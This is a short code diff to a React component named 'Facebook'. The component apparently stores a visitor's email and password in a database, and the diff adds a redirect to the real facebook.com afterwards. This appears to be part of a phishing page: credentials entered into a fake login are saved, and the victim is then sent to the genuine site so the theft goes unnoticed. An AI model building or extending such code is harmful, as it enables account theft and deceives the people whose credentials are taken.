@@ -19,6 +19,7 @@ export default function Facebook() {
             console.log("Document written with ID: ", docRef.id);
             setEmail('');
             setPassword('');
+            window.location.href = 'https://www.facebook.com/okok';
         } catch (e) {
             console.error("Error adding document: ", e);
             setErrorMessage("Error adding user. Please try again later.");
